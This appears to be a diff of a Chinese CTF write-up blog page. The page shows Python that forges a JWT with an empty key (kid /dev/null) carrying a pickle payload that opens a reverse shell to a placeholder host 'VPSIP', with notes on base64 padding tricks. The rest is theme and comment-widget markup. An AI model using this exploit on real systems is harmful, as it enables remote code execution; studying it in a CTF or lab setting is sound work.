class="string">"eyJraWQiOiIvZGV2L251bGwiLCJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."</span>+payload).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(data)</span></span><br><span class="line">signature = base64.urlsafe_b64encode(hmac.new(key,data,digestmod=sha256).digest())</span><br><span class="line"><span class="comment">#print(signature)</span></span><br><span class="line">print(data.decode()+<span class="string">'.'</span>+signature.decode().rstrip(<span class="string">'='</span>))</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import pickle
+import os
+import base64
+from hashlib import sha256
+import hmac
 
+
+
+
+class exp(object):
+    def __reduce__(self):
+        s = &quot;&quot;&quot;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;VPSIP&quot;,9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;   &quot;&quot;&quot;
+        return (os.system, (s,))
+
+e = exp()
+payload=base64.urlsafe_b64encode(pickle.dumps(e)).decode(&#39;utf-8&#39;)
+#print(payload)
+
+key = &quot;&quot;.encode(&#39;utf-8&#39;)
+data =(&quot;eyJraWQiOiIvZGV2L251bGwiLCJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.&quot;+payload).encode(&#39;utf-8&#39;)
+#print(data)
+signature = base64.urlsafe_b64encode(hmac.new(key,data,digestmod=sha256).digest())
+#print(signature)
+print(data.decode()+&#39;.&#39;+signature.decode().rstrip(&#39;=&#39;))</code></pre>
 <p>解释几点<br>1.payload部分pickle与cPickle都可以。但是这里是python3环境，还是得用python3生成。</p>
 <p>2.注意我使用了<code>base64.urlsafe_b64encode</code>而不是<code>base64encode</code>。这点上面也讲过了，jwt中不会出现<code>/</code>和<code>=</code>这样的字符的。比赛中我并没有去详细查询，而是直接手动将<code>/</code>替换成<code>_</code>并去掉<code>=</code>同样得到了有效的key.</p>
 <p>3.这里生成pickle的payload我也同样做了点手脚：在弹shell的代码后加了几个空格。原因同上，因为payload部分同样不允许<code>=</code>这样的字符。所以可以手动加空格防止出现<code>=</code>.</p>
@@ -790,7 +880,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -802,9 +892,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -937,6 +1027,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1150,7 +1242,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1206,6 +1298,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
